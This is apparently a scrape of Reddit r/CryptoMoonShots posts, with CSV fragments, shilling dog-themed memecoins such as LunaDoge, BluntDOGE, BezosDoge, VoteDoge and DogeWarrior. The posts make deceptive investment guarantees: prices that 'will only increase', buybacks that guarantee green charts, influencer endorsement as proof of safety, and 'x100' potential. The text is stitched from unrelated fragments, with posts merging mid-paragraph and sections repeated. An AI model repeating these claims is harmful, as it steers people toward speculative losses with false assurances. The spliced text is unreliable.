ROGE is the symbol of Crypto vs stocks. The debate that's been ongoing for the past few months. In short, while Robinhood manipulates the market at the expense of retail investors, our token focuses on helping all its believers. Through a universal tax and a revolutionary feature unique to cryptocurrencies, ROGE is the people's coin.

While we are the RobinHood of Crypto, we are everything the RobinHood app is **not** to the Stock Market. Community-driven, transparent, and fair. Our BuyBack feature, inspired by MiniDoge, is the best tokenomic feature in the market. Having a constant buyback feature doesn’t really impact or change the chart in the long run, whereas targeted buybacks have much more of an impact. The feature we have in our contract, called AUTOBOOST, generates buy orders when the chart takes a serious dip, guaranteeing that new investors are always looking at a nice green chart.

In addition, a second primordial feature for any token project which wishes to survive the test of time is a tax that automatically converts BNB and sends it to a Marketing Wallet. As all investors in the Defi space are aware, Marketing is the most important factor in the growth and life of a coin. Having a marketing fee that is sent to a wallet is the difference between a short-term and long-term project. Running out of Marketing funds is synonymous with the end of a project, and having a “marketing wallet” is inefficient in that sense. Having a marketing fee, however, guarantees that as long as trading volume is reasonably high, some funds are being put at the service of marketing and growth. 

**Why us?** 

We want to create something everyone can be proud of. A project with a smooth-looking long-term chart, led by developers with good intentions and a team that wants to create sustainable growth for investors. 

We believe this can only be achieved by being fully transparent. In that sense, we are not shying away from the fact that most tokens in the DeFi space are genuinely lacking “intrinsic value”, and we have adjusted our approach accordingly. 

Moving forward, all we want is to create a fun environment and unite our community behind one goal: The Moon. Learning from all successful projects, and especially our godfathers SafeMoon and DogeCoin, we believe there is no reason to shy away from the truth and leverage it to our advantage.

**How do we Moon?** 

By each playing our part. An important lesson from the time our team has spent in the Defi space is the following one: community engagement is as important as marketing, and having a strong united community is essential to attract more investors.

BabyDoge Diamond has a very unique story behind it. This is truly a community driven project. The developers of this project made an unsustainable contract that had a non-functional liquidity feeding wallet, which meant the project would not have survived more than a year. After the developers abandoned the project, four community members decided to take over and relaunch the project. The project was relaunched successfully and people were airdropped the tokens they had in the previous contract. It eventually became one of the most trusted project for the community, with a team that never gave up and a community that held on through all the ups and downs. They are still striding to be the best and they are offering trust and reliability to the new investors. The story behind $BDD has inspired a lot of people. With a transparent team that is ready to deliver, they need honest and reliable investors in this project to take this project to the next level. The team is welcoming people to be a part of the community and just look around and be absolutely sure before investing in the project. Some specifications about the project are given below.

DOGE,CryptoMoonShots,🌜 LunaDoge 🌜 [$2.5M market cap] One of the healthiest charts on BSC 📈," 

The LunaDoge token ($LOGE) takes the deflationary tokenomics of Safemoon and fuses it with the novelty of Dogecoin. LunaDoge operates just like SafeMoon, Shiba Inu, Elongate, and Moonrat with regards to a quadrillion dollar token supply and deflationary nature.

LunaDoge is a fork of MoonRat and SafeMoon. Both projects have been audited by CertiK, assuring users that there is no backdoor in the code for the team to scam its investors. $LOGE is currently in it’s infancy and is only available on PancakeSwap🥞.

Why does this token have Moon potential???

✅Hold and Earn

· Every transaction incurs a 10% fee · 5% distributed to hodlers (LOGE will automatically get added to your wallet) · 5% permanently added to liquidty creating a steady rising floor Anti-Whale measures · Transactions greater than 0.5% of supply rejected to prevent Whale manipulation

✅Liquidity Locked

· Team tokens (24% of total supply) locked using third party provider DXSALE · Team tokens RE-LOCKED as of May 5th · 15% for 6 months, 5% for 3 months; 4.7% for 14 days which will be re-locked again · 1% burn every 2 weeks to a dead address which will create an ever decreasing supply of LOGE

✅100% Community Driven

· LunaDoge is fully transparent · Whitepaper · All team and LP tokens have been locked · Every trade automatically contributes to generating liquidity

✅Bi-weekly Token Burn

· Every second week the team will burn 1% of total $LOGE supply from their own tokens · This coincides with team token re-locks

✅Marketing and Branding

· They have a growing community on Telegram, Twitter, and Instagram (links at the bottom) · This is a key element in the success of any product · The graphic design team has developed an appealing logo · Community contests such as a meme competition (running until May.8th) · They've partnered with multiple influencers to build brand awareness

✅What’s in the Pipeline?

· Coinmarketcap listing (pending) · Coingecko Listing (pending) · External audit · Website updates · LunaDoge Mars Program · Cross-chain integration · Token farming · Partnership rollout · Community growth

This team has continued to demonstrate their commitment to the LONGEVITY of this project and have continually increased my investment confidence through their actions! Its holders are put first and that seems to be a rarity given the recent landscape of startup projects.

Do your own DD and let me know what you think! Hopefully we’ll take a ride to the moon together 🚀

DOGE,CryptoMoonShots,"Runner | The Origin of the Word ""Doge"" is revealed!","What is **RUNNER** about?

Many of you might not know that the origins of $DOGE trace back to the TV show **Homestar Runner**. Homestar Runner is a pioneering web cartoon series that first took the internet by storm in the early 2000s.

The use of the misspelled word ""DOG"" actually goes back to June 24th, 2005, when it appeared in a **Homestar Runner** episode.

In it, $RUNNER calls Strong Bad his **""D-O-G-E""** in an attempt to distract him from his work.

Clueless athlete, always recognized by his red shirt and signature hat.

DOGE,CryptoMoonShots,"🚬 BluntDOGE has a revolutionary 420 buyback burn-match feature - Redman Endorsed, High Reflections 🔥 Daily BNB giveaways | Stealth launching TODAY 7PM UTC 0","🔥 WE WILL BURN THE ENTIRE SUPPLY FASTER THAN ANYONE HAS EVER DONE 🔥 

What makes our token unique is that BluntDOGE will burn tokens at a faster rate than anyone has ever seen! In two different ways:

🔥 BurnMode 🔥

To encourage buying and discourage selling a rally can be started with BurnMode... Every buy is matched by an equivalent burn, while sells trigger buy-backs for getting green in the chart. 👀💹 During burn-mode all sells have increased (Plus 10 percent) reflection tax and buys lowered marketing+LP tax to ZERO (0) PERCENT. BurnMode persists until manually deactivated or a randomized, but limited amount of time has elapsed,

🐶 Big-Drag 🚬

Hype up big milestones with a MASSIVE BURN ❗️ Big-Drag burns a huge amount of tokens and initiates BurnMode for a rally.

📈Every 50,000 market cap we will burn 6.9 TRILLION TOKENS! (69)

12% Buy tax / 18% sell tax to punish paperhands.

5% reflections, 5% liquidity, 2% goes to marketing on purchases. On sells it's amped up to 8%/8%/2% respectively. 12% buy tax - 18% sell tax

Redman gave us a shout-out and endorses BluntDOGE:

[https://twitter.com/BluntDoge/status/1418426798694674437?s=19](https://twitter.com/BluntDoge/status/1418426798694674437?s=19)

👀🔥Our INITIAL BURN on launch will be a token burn of 420,000,000,000,000 tokens!

Remaining supply will be 580trillion. Due to our INCREDIBLE burn rate post-launch and many incentives to buy, this make for an extremely bullish atmosphere.

DOGE,CryptoMoonShots,🐶 $BezosDoge – Presale starting soon | Pre CMC & CG | 🐶Rewards in $SHIB | 💎10 000 NFTs to be minted after launch | 🌟Presale participants will get 1 free NFT mint for every 0.2 BNBs invested | Utility NFTs | 🎮 P2E game launching 2022 | 🚀Next x100,"# Presale will be announced once the telegram group reaches 2000 members. Be one of the first!

Follow their community to learn more about this token:

[https://t.me/BezosDoge](https://t.me/BezosDoge) 

[🐶](https://old.reddit.com/r/CryptoMoonShots/comments/qa4hii/buy_dogestyle_now_before_they_get_listed_on/)**What is Bezos Doge?**

Bezos Doge is the next serious moonshot. Elon Musk is infamous for shilling Doge and have most likely made bank by doing it, and Bezos won’t be worse – rather better. $BDoge will be for Bezos what Doge is for Elon. Jeff Bezos will be stalked on twitter all day until he gives in and becomes a holder.

Bezos Doge will launch a 10 K NFT collection shortly after launch with NFT characters that will have utility in a coming P2E game featuring both Bezos himself and his beloved Doge. (launching in 2022)

The NFTs will have unique capabilities and there will also be both breeding (yes, do expect dog centaurs) and staking possibilities.

Every 22 333 334 $BDOGEs possessed (0.2 BNB at presale rate) will give you 1 NFT. 1 BNB invested in presale = 5 free mints when the NFT collection launch. 

**🚨Presale Information🚨**

The presale will be announced once there are 2 K members in the TG.

**🤑Why does it makes sense to buy $BDOGE?**

✅NFT and P2E are the by far hottest crypto categories right now. In this case, you don’t only get tokens in a promising project, but also a “free” NFT for every 0.2 BNB invested in the presale. One buy – exposure to the two most hyped categories.

✅Super solid marketing. The CMO behind this project have been involved in many successful tokens such as $ShibaInu and Loud NFT

✅The token team are real life friends and are managing this token as a cooperation. It is their main focus.

✅1 entry, 2 bets. Double upside possibility. If the tokens do 20x and the NFT floor becomes 2 BNB(10x) – you have 30x.

✅Half downside risk, if one of the assets doesn’t perform as good as you like (god forbid), you still have a chance that the other asset does. 1 entry, but you get to bet on 2 horses.

**💰Tokenomics💰**

📍Total supply: 100 000 000 000 tokens

Distribution:

📍10 % dedicated to the team

📍10 % dedicated to seed investors

📍10 % dedicated to staking rewards

📍10 % dedicated to future listing at Bitmart

📍35 % dedicated to public presale

📍25 % dedicated to Pancakeswap listing

**♻️Taxes and Redistribution**

**📌** 5 % Redistribution in Shiba Inu ($SHIB) 

**📌** 5 % Marketing

**📌** 2% Liquidity boost

**🔗 Join the community and feel the great vibe!**

Bezos Doge token’s team have given you few social platforms that you can engage with and communicate with other people in the project. Right there you can contact the team and ask them anything you feel like it! I have done it myself and they are flawless in their response.

DOGE,CryptoMoonShots,VoteDoge Airplane Banner and CEX Listing Update!,"Hey all! We've got some exciting news to share.

Airplane Banner Over Atlanta
Next week, keep your eyes on the skies over Atlanta! With the Biden-Trump debate happening on June 27th, we'll be flying an airplane with a VoteDoge banner over the city to grab everyone's attention! This bold move is just the start of our ambitious plans to get VoteDoge noticed by a wider audience. Imagine the impact as the debate draws in viewers and VoteDoge soars overhead. It’s going to be epic and a perfect way to get people talking about VoteDoge.

CEX Listing
June 25th is the day! VoteDoge will be listed on a major centralized exchange (CEX). This is a big deal and makes it easier for new people to join our community when we launch our marketing plans. The CEX listing is a crucial step in our journey, opening up new opportunities for our community and increasing accessibility for new investors. The timing, right before the debate, is strategic to maximize our visibility and impact.

June Marketing Push
We've raised $11,000 for a huge marketing push this month! Here’s what we’ve got lined up:
- A CEX listing on June 25th, strategically placed right before the debate.
- A new animation video dropping before the debate.
- Reddit and Dex ads.
- Songs on Spotify.
- And much more! We’re pulling out all the stops to make sure VoteDoge gets the attention it deserves. Our community's dedication and support have made this possible, and we’re excited to see where this momentum takes us.

Join us at VoteDoge.com and on Telegram to be part of the action. Why choose between Biden or Trump when you can VOTEDOGE?",573,2024-06-19 15:33:25,39

DOGE,CryptoMoonShots,"🚬 BluntDOGE just launched yesterday and WEED-o-nomics are taking over BSC! 13% Reflections, 0% buy tax during burn mode, 100% locked LP and no team wallets 🔥","🔥 WE LAUNCHED YESTERDAY AND WE ARE CURRENTLY AT 250k MCAP 🔥

We burned 470t tokens, 47% of our total supply! Nobody has ever burned like this!

We have the highest quality memes, a completely safe project w/ locked LP, no dev wallets, and only a 2% marketing tax. 

Marketing has only just begun, poocoin banners are being made as we speak, promos and other shoutouts already done or in progress. AMA tonight.

🔥 BurnMode 🔥

To encourage buying and discourage selling a rally can be started with BurnMode... Every buy is matched by an equivalent burn, while sells trigger buy-backs for getting green in the chart. 👀💹 During burn-mode all sells have increased (Plus 10 percent) reflection tax and buys lowered marketing+LP tax to ZERO (0) PERCENT. BurnMode persists until manually deactivated or a randomized, but limited amount of time has elapsed,

🐶 Big-Drag 🚬

Hype up big milestones with a MASSIVE BURN ❗️ Big-Drag burns a huge amount of tokens and initiates BurnMode for a rally. 

📈Every 50,000 market cap we will burn 6.9 TRILLION TOKENS! (69)

12% Buy tax / 18% sell tax to punish paperhands.

5% reflections, 5% liquidity, 2% goes to marketing on purchases. On sells it's amped up to 8%/8%/2% respectively. 12% buy tax - 18% sell tax

Redman gave us a shout-out and endorses BluntDOGE:

https://twitter.com/BluntDoge/status/1418426798694674437?s=19

👀🔥Our INITIAL BURN on launch was a token burn of 420,000,000,000,000 tokens! 

Since then we have burned an additional 51t tokens!

Due to our incredible burn rate, high reflections, and extremely high sell tax BluntDOGE has no other choice but to moon! Come and burn with us!

Blunt Giveaways: Members who have not sold a single BLUNTDOGE token are eligible to be airdropped free BNB so they can acquire as much or as little 🍃 as they desire!

Anti whale system!

Max 3% total token supply wallets, max 0.3% total token supply sell, max 30% of individual wallet supply sell.

DOGE,CryptoMoonShots,The Election Race Heats Up: VoteSHIBA Speaks Out Against VoteDoge ,"Folks, the election race is heating up especially with the upcoming presidential debate and let me tell you, there have been some very unexpected turns. VoteDoge, they’ve been trying non-stop to sabotage VoteSHIBA with all kinds of false accusations. It’s a disgrace. So much FUD – fear, uncertainty, and doubt. Sad!

Now is the time to speak up! We’ve been gathering a lot of information on VoteDoge over the course of a few weeks. Believe me, it’s huge.

Did you know one of the VoteDOGE members (TokenGuy) was part of the team that helped create VoteSHIBA? Can you believe it? A Double Crosser! Fun Fact Folks, He tried selling the tokens behind the Devs Team & community's back and got caught red-handed. Then got kicked out. Hah!

It doesn't stop there folks. We've got more news coming up that show that not only has he done this to us, but to other communities as well. Maybe at VoteDOGE. Who knows?

But don’t worry, folks, this is just the beginning. We at VoteSHIBA, we’re fair and loving. We won’t expose everything. Not yet.

We’re going to continue in this election race. We’re going to rise to the true glory we deserve. Remember, VoteSHIBA is the most honest candidate in the race. We're going to expose PussyDoge for who they really are and show you who we are.

So don’t forget, vote for VoteSHIBA. The best, the most honest. Let’s make VoteSHIBA great again!
P.S. Giveaway happening at the moment. ;) 

Vote for VoteSHIBA – the true and fair choice!",595,2024-06-04 22:55:12,36

DOGE,CryptoMoonShots,Little Baby Doge Coin | Amazing Team | Launched Two Days Ago🚀 | Fast Growing Community💗| Locked Liquidty🔒| Listed On CMC | Total Marketcap 7.6M,"Little Baby Doge is a hyper-deflationary decentralized buyback token, community-driven project that aims to reduce global warming by being the no 1 cryptocurrency platform for fighting climate change!

**🔁Buy Back🔁**

The buyback function is a major part of the LBD’s strategy. It lowers supply and raises demand, which results in an immediate effect on price when activated.

🔥 **Burn** 🔥

The tokens bought through buyback are immediately burned. This creates a true burn and guarantees the price per token will increase every time a buyback is activated because each activation reduces supply, which increases demand for what's left of the current circulation.

🔒 **Locked Liquidity** 🔒

We want to make sure that all of our investors are protected, which is why we're locking Little Baby Doge LP Tokens. For the sake of security and trust in our LBD community!

**Little Baby Doge Ecosystem**

The Little Baby Doge team has a well-organized ecosystem that will meet the needs of individuals in terms of products and services. They've made an LBD wallet that features live statistics, news, and updates about the adorable puppy.

The LBD Exchange & Farms platform is a user-friendly SWAP platform that has enabled a simple swap of all BEP-20 tokens; this feature will be available in Q4.

Aside from that, they have an LBD Lottery that allows holders to gain more money through a readily accessible lottery.

LBD Exclusive NFTs is a limited-edition LBD Non-Fungible Token (NFT) marketplace and auction house. Little Baby Doge has a meme NFT series set to be released in Q4

**Who are the founders of LBD**

Founded in Stockholm, Sweden in 2021 by an international team of climate change activists who wanted to find a way to take action against the dangerous effects of global warming. Little Baby Doge is created with one purpose - to help make the world a better place.

DOGE,CryptoMoonShots,Woof! Woof! - DogeSnacks($SNACKS)- A new launchpad for those 'smaller' projects |The first Initial DEX Offering(IDO) on DogeSnacks.org on the 14th July Don’t be left behind🚀,"**What is DogeSnacks? Let's Dive into background of information!**  
   
✅ Dogesnacks is focused on becoming the most flavored decentralized multi-chain IDO launchpad.  The launchpad gives emerging DeFI projects owners the power to distribute tokens, raise liquidity, and pledge security to their investors.  


 ✅ $SNACKS is the community token for the DogeSnacks IDO Protocol, with an innovative deflationary mechanism that includes a redistribution and burning system that rewards all its holders. With only 420 million $SNACKS in existence, a couple of yummy snacks is all you need to hodl for that sugary sweet accrued value.  


 ✅ A flavorsome protocol of restocking the Golden Tuck Shop with $SNACKS is achieved with two main functions;  
1.  A 5% contribution is sent back to the Golden Tuck Shop with every transaction made in $SNACKS.  
2.  All successfully launched IDOs contribute a fee that is used for acquiring $SNACKS on Uniswap and sent to The Golden Tuck Shop.  
   
✅Every 24-hours, snacks are randomly generated and placed on the $Doge Market Chart, which is found on the DogeSnacks landing page.  


 ✅The goal is for Doge, the little dog in the spacecraft, to eat the snacks on the chart, triggering a specific event within The Golden Tuck Shop. Navigating the spaceship is dependent on the $DOGE cryptocurrency price; if the market price of $DOGE goes up or down, so does Doge in the spacecraft.   


**DogeSnacks Tokenomics**   
DogeSnacks IDO -  239.400.000 $SNACKS  
Liquidity Pairing -   70.000.000 $SNACKS  
The Golden Tuck Shop - 42.000.000 $SNACKS   
 Project Fund - 68.600.000 $SNACKS  
 Total Supply - 420.000.000 $SNACKS

Passive RewardS And Auto-Matic Buy Backs!

Through Nano Doge, we hope to create a trustworthy, community-based coin. Many studies have shown that the finance industry is one of the least trusted industries worldwide and even worse, that crypto is the least trusted asset class within the finance industry. Due to all the rugpulls and scams happening lately, especially in the BSC space we could relate. To make an impact and change peoples perception of crypto we teamed up and set the ultimate goal to build trust and credibility in the crypto and BSC space again.

&#x200B;

❓What is DogeWarrior

&#x200B;

DogeWarrior is a fusion between gaming and crypto. Our multiplayer online game uses the DogeWarrior Token (DWR), deployed on the Binance Smart Chain. This token offers features such as autoburn, a liquidity generation mechanism, and rewards its holders with every transaction. Users can also use this token to interact with the entire DogeWarrior ecosystem.

&#x200B;

The DogeWarrior project started before we even knew we wanted to use the Blockchain technology. The creation of a token and the integration with the crypto space came to us as obvious solution for the problems we were facing. What this means is that the DWR token has a real use case, and brings actual value and utility to the DogeWarrior community. 

&#x200B;

Besides our card-based fighting game, we have also started development on products which we will release in the next quarter. We have planned a NFT Marketplace, Decentralized Exchange (which will feature Yield Farming, Staking, and a Lottery), and a gaming platform with dozens of games which will make real use of the blockchain technology.

&#x200B;

We are commited to this project and have a very specific goal in mind: to develop an easy to pick up and play card game with full crypto integration, that users can play both on desktop and on mobile.",1644,2021-09-06 15:32:43,75

About Moonradar

MoonRadar is a Boosterpad for projects built on the Binance smart chain and provides a layer of security for investors by whitelisting safely traded projects. Our aim is to increase the quality of Blockchain projects by building a set of tools that can be leveraged by Project creators to boost their value and by investors to analyse and invest in projects at an early stage. At MoonRadar, we are building a suite of tools both for project creators and investors in the BSC ecosystem. For Project creators, we bring value by adding key functionality to their token. For investors, we provide key metrics and early calls to Gems to jump on quite early and ride the wave while keeping their investments safe.

FEATURES

Token Whitelisting - Our custom swap built on Pancakeswap to trade whitelisted tokens. We whitelist tokens based on a number of key metrics that we anayse. Here is an article highlighting the benefits of trading with our swap engine - https://blog.moonradar.finance/advantages-of-trading-with-moonradar-3e42a24e431b

MoonDex - We are building custom DeX interfaces for project creators to add value to their projects. We've recently onboarded BabyDogeCoin, Tiki token, BabyShibaInu, Moonrise. Check out what BabyDoge have to say about us - https://twitter.com/BabyDogeCoin/status/1400102248282214401

MoonBrowse - Users of Moonradar benefit from the early calls that we give to BSC Gems. We've given early calls for tokens like $MIL, $HUNNY, $BabyDogeCoin and all of them did very well.

MoonBoard - We're building an analytics dashboard around whitelisted projects where users can track their portfolio, earnings from Reflection and analyse token metrics including price dump alerts.

MoonBuy - Users are able to buy crypto with Visa card on Moonradar. Project creators can use this feature to increase token adoption on their websites.

Casino & Games - Project creators can add casino & gaming functionality to their tokens and burn the revenue generated from it to make the token hyper deflationary with a utility.

Stakingpad - Project creators can encourage users to add liquidity for their token by providing token rewards.

Launchpad - Soon, project creators will be able to launch their tokens on our launchpad.

Some more interesting features that we are launching can be found on our Roadmap - https://moonradar.finance/wp-content/uploads/2021/07/cfa6032b-7bd3-4990-b1f2-fb440e080847.pdf

The project is already listed on Coinmarketcap & Dapp Radar.

$MRF TOKEN

$MRF is a utility token that will be at the core of our ecosystem. The features that we are currently offering(DeX, Buy Crypto, Dashboard, Donate, Casino, Staking pad, Launchpad) will have to be bought by staking $MRF tokens. We plan to extend these features further to become a one stop boosterpad solution for all BSC projects. On the other hand, holders of $MRF tokens will get early calls from us to help them hunt Gems and get into the game before anyone else does! We essentially want to help people build safe & quality projects and connect investors to those projects! MRF lie at the center of this ecosystem!

Admin: ""Friends; Website TBA. Cmc and cgc soon. Share $dogefather. We need grow this community!""

This it it chiefs, what we've all been waiting for. Papa Elon has SPOKEN.

You all know what happens when Elon Musk tweets. We all make money. That's just how it is. That's how it's always been and that's how it will probably keep being, Lol. 

Why this DogeFather? With all the scams going around? Well....

CaptainJack  tweeted about this one and supports it in particular so you know this project is 100% SAFU. He checks contracts and developers before advertising to his followers or why else would he have 80k+ twitter followers and a massive telegram following? Most of you should know him by now.

&#x200B;

50% Tokens BURNT so realistically market cap is HALF of what it shows on poocoin. Market cap currently ONLY $300k. For an Elon coin that is OUTRAGEOUS

DogeWarior is a card-based fighting game using both meme characters and actual real life (cartoonized)

fighters. By collecting, training, and leveling up your fighter your squad grows stronger, unlocks new skills,

and can enter new competitions and tournaments. Each tournament unlocks new collectibles which you

can trade, collect, or utilize in battles.

Players will collect cards through playing and progressing through a tier-based system. Unlocking new

tiers will reward players with new packs, card designs and bonus cards which they can use in battle or to upgrade their fighters.

&#x200B;

How does the game work?

&#x200B;

DogeWarrior is a turn-based fighting game where the objective is to eliminate the other player’s squad before the opponent can.

❖ Each player starts the game with 3 cards in their hand that they choose before matchmaking.

❖ Players will pick a card from their hand and choose a stat to battle with and which of the opponent’s cards to attack.

❖ Each card has a set number of hearts or “Lifepoints(LP)”, when they run out the card is

discarded and you are left with 2 cards;

❖ The chosen stat is then compared to that of the opponent, higher number wins the round (loser loses 1 LP)

❖ The game is over when one of the players runs out of cards.

❖ Some cards will have special ‘passive’ abilities which can impact overall gameplay. Players are also free to use 3 bonus cards per match which can either increase their fighter’s abilities or diminish his opponent’s deck. Beware, these cards are rare to come by!

DOGE,CryptoMoonShots,The True Father of All Doge Memecoins,"### Colon: The Father of Doge and All Dog Memecoins

Did you know that before Doge, there was Colon? Often overshadowed by the fame of Doge, Colon is actually the predecessor of all dog-themed memecoins. Colon's importance in the crypto world is undeniable, as it laid the foundation for all the beloved dog memecoins we see today, including the OG Shiba Inu, Floki, Bonk, Kishu, Neiro, and of course, Doge itself.

Without Colon, Doge might not have become the adorable and widely beloved meme that has dominated the crypto space. 

In fact, Colon's significance was highlighted as early as 2009 in Atsuko Sato's blog, where she celebrated Colon as the original. For those unfamiliar, Atsuko Sato is Kabosu’s owner—the Shiba Inu who inspired the famous Doge meme. Sato's blog posts and tweets about Colon confirm his foundational role in the world of dog-themed memecoins. 

### Proof of Colon’s Legacy

Atsuko Sato first introduced the world to $DOGE, sparking the first generation of dog-themed memecoins. Now, by revealing Colon as Doge's Father, she honors the legacy and history behind these tokens.

With $COLON, the season for the Father of Doge has begun. Get ready to embrace a new wave in the crypto world! 🐶

**3% added to the liquidity pool**

The contract accumulates tokens on buy/sells and then adds them to the liquidity pool to create a solid price floor and increases the stability of the token for everyone's benefit!

**3% sent to a marketing wallet**

A token is nothing without it’s marketing power. Combine a substantial initial marketing budget with ongoing accumulation we’re destined to the moon. Following advertisements on time square and multiple exchange listings that send Daddy Doge to the moon alongside his son.

DOGE,CryptoMoonShots,SaveBabyDoge 🐶 🚀 Fairlaunch 1h AGO ALREADY x100 !! NEXT MEME COIN going to 2M market cap and going to 50m !!! ⏰ Locked Liquidity ✅ Verified contract 💎 100x Potential 🚀,"the aim is to be the biggest dog loving community in the Defi space.

🐶 SaveBabyDoge is a community-driven frictionless yield farming token. SaveBabyDoge distributes 5% to holders. This incentivizes all holders and rewards people that stay on board. 5% of transactions go towards the 'liquidity' which will make SaveBabyDoge stronger on each transaction.

**🐳** They will be an anti-dump system. These combined processes will help prevent large dips and the project will grow nice and steadily. No holders like big dumps, so this token has taken every measure to ensure that it protects from that. All of the above made this protocol beneficial for long-term investors because the price of the token will only increase over time.

✅ Additionally, 100% of the liquidity will be locked which means that you do not have to worry about any rugs. The contract is verified (we can analyze the contract - everything is transparent).

📆 Other listing is coming soon (CoinGecko, CoinMarketCap). I hear the dev said it is a fully community-driven token and the project will be based on a promotional target to reach out to people and get the project on the map. - auto-farming to all holders!

💎**10% tax!**

💻 Introduction

DogeWarior is a card-based fighting game using both meme characters and actual real life (cartoonized)
fighters. By collecting, training, and leveling up your fighter your squad grows stronger, unlocks new skills,
and can enter new competitions and tournaments. Each tournament unlocks new collectibles which you
can trade, collect, or utilize in battles.
Players will collect cards through playing and progressing through a tier-based system. Unlocking new
tiers will reward players with new packs, card designs and bonus cards which they can use in battle or to
upgrade their fighters.

💻 Mechanics

How does the game work?
DogeWarrior is a turn-based fighting game where the objective is to eliminate the other player’s squad
before the opponent can.
❖ Each player starts the game with 3 cards in their hand that they choose before matchmaking.

❖ Players will pick a card from their hand and choose a stat to battle with and which of the
opponent’s cards to attack.

❖ Each card has a set number of hearts or “Lifepoints(LP)”, when they run out the card is
discarded and you are left with 2 cards;

❖ The chosen stat is then compared to that of the opponent, higher number wins the round (loser
loses 1 LP)

❖ The game is over when one of the players runs out of cards.

❖ Some cards will have special ‘passive’ abilities which can impact overall gameplay. Players are also
free to use 3 bonus cards per match which can either increase their fighter’s abilities or diminish
his opponent’s deck. Beware, these cards are rare to come by!",1341,2021-09-19 12:37:15,73

Don't miss out,"Right here the new era of dogefamily will be made. Baby DogeBack with DOGE reward and buyback. Presale on Dxsale on 9th July. Don't miss out 




BABY DOGEBACK is a project made by our community, but ultimately, it’s for our community. That’s why we are giving 15% of every transaction back to YOU! We invite you to be part of this new innovative concept and join as early investors. 

We are the meme-based token that aims to be the best protocol in promoting fun and joy. That's why, don't be so serious, dude 🤪
Our community will be stress-free and warming, everyone is welcome to join the fun 🥳.

🎼 BabyDoge Back back back back
BabyDoge Back back back back 🎶 let's sing together
It is aptly named ! It’s a simple concept – it combines the two trending mechanisms : buy back and reflect. 

 Tokenomics 

-Total supply: 1.000.000.000

-Burned and locked: 600.000.000

-Add to liquidity: 350.000.000

-Team & marketing token: 50.000.000 (locked for 13 months)

Tax system: 15% tax, 10% is used to purchase DOGE which is paid out in dividends roughly every 30 minutes to holders automatically, 5% is used to buy back the token to keep the chart healthy and the tokens that are bought are burned!


🛡 Audit shield:
We have paid 10bnb for a full, high-level security audit from Shield Network X Solid Group, as well as a full medium article writeup.  We are waiting for the final report to show our family BabyDogeBack.
It's doge season and you guys know what that means. Every doge coin it's blowing up lately, and the time of BabyDogeBack has come. A doge coin with redistribution in OG dogecoin. Soon we will have Elon Musk tweet about.

Contract:
 0x66625174a7981f9b07b2efd1e274eba958175b19

Community driven and giving back to communities! Our investors will have many opportunities to share in the success of this great crypto that has a great cause!

Revolutionary Token that will help create a better environment for dogs and families, and also bring them together!

Our goal is to take proceeds from the token and donate them to local parks to improve and build DogeParks across multiple cities in multiple countries.

What is a DogePark?

A DogePark will be a facility for dogs that don't have a home. We will buy land and build state-of-the-art shelters for dogs. The facilities will include a large park for these dogs to play and have fun while they wait for a new family! DogePark shelters will not charge families for adoptions! We strongly believe that there should not be a cost for adopting a dog other than the cost of your time and love for our furry friends! Please help us in creating this beautiful and wonderful future together!

We also have partnered with several dog shelters to cover the costs of adoption fees for families that want to adopt a dog but cant afford the fees. Anyone interested in utilizing this feature will be able to fill out an application on our website and may be eligible to have their adoption and first veterinarian visits paid for by Dogepark!

What makes us so special? Our developers have a long history of dog training and adoption. We have dedicated our time and efforts into bettering the lives of unwanted animals and helping bring dogs home to people who want to be loving owners!

Our Tokenomics:

Total Supply: 1,000,000,000,000

98% burned

8% Buy Tax (6% marketing/charity, 2% LP)

12 % Sell Tax (6% marketing/charity, 3% reflections, 3% LP)


Short-term goals for the token's growth:

– Get listed on CMC and CG

– Trending on CMS twice daily

– Work with influencers to promote the project

– Run a week-long promotional campaign on social media

– KYC with coinmooner


Medium-long term goals:

– Help 5 families adopt a dog, publish success stories

– Conceptualize the first DogePark

– Get billboards posted in targeted dog-friendly communities

– Work with local community vets and animal shelters to start building awareness

More about our longer-term vision can be found on the site, and our marketing strategy will be evolving over the next week – as we tailor them to the responses we get with the larger steps. 😊

DOGE,CryptoMoonShots,LunaDoge [$8M market cap] Ethical Memecoin with one of the most bullish charts on BSC,"lunadoge.finance

&#x200B;

Remember my thread here 2 weeks ago? Since then we've done a 10x, and the BEST is yet to come! The TG is growing, holder count growing, marketcap growing.

&#x200B;

The LunaDoge token ($LOGE) takes the deflationary tokenomics of Safemoon and fuses it with the novelty of Dogecoin. LunaDoge operates just like SafeMoon, Shiba Inu, Elongate, and Moonrat with regards to a quadrillion dollar token supply and deflationary nature.

&#x200B;

LunaDoge is a fork of MoonRat and SafeMoon. Both projects have been audited by CertiK, assuring users that there is no backdoor in the code for the team to scam its investors. $LOGE is currently in it’s infancy and is only available on PancakeSwap🥞.

&#x200B;

Why does this token have Moon potential???

&#x200B;

✅Hold and Earn

&#x200B;

· Every transaction incurs a 10% fee · 5% distributed to hodlers (LOGE will automatically get added to your wallet) · 5% permanently added to liquidty creating a steady rising floor Anti-Whale measures · Transactions greater than 0.5% of supply rejected to prevent Whale manipulation

&#x200B;

✅Liquidity Locked

&#x200B;

· Team tokens (24% of total supply) locked using third party provider DXSALE · Team tokens RE-LOCKED as of May 5th · 15% for 6 months, 5% for 3 months; 4.7% for 14 days which will be re-locked again · 1% burn every 2 weeks to a dead address which will create an ever decreasing supply of LOGE

&#x200B;

✅100% Community Driven

&#x200B;

· LunaDoge is fully transparent · Whitepaper · All team and LP tokens have been locked · Every trade automatically contributes to generating liquidity

&#x200B;

✅Bi-weekly Token Burn

&#x200B;

· Every second week the team will burn 1% of total $LOGE supply from their own tokens · This coincides with team token re-locks

&#x200B;

✅Marketing and Branding

&#x200B;

· They have a growing community on Telegram, Twitter, and Instagram (links at the bottom) · This is a key element in the success of any product · The graphic design team has developed an appealing logo · Community contests such as a meme competition (running until May.8th) · They've partnered with multiple influencers to build brand awareness

&#x200B;

✅What’s in the Pipeline?

&#x200B;

· Coinmarketcap listing (pending) · Coingecko Listing (pending) · External audit · Website updates · LunaDoge Mars Program · Cross-chain integration · Token farming · Partnership rollout · Community growth

&#x200B;

This team has continued to demonstrate their commitment to the LONGEVITY of this project and have continually increased my investment confidence through their actions! Its holders are put first and that seems to be a rarity given the recent landscape of startup projects.

&#x200B;

Do your own DD and let me know what you think! Hopefully we’ll take a ride to the moon together 🚀

DOGE,CryptoMoonShots,"💎HappyDoge - Be happy, join the vibe! | Mature community | 111k Marketcap | Amazing marketing plans | Transparent devs | Developing defi platform for the Cardano network | Great potential","**Why should you give a special look at Happy Doge?**

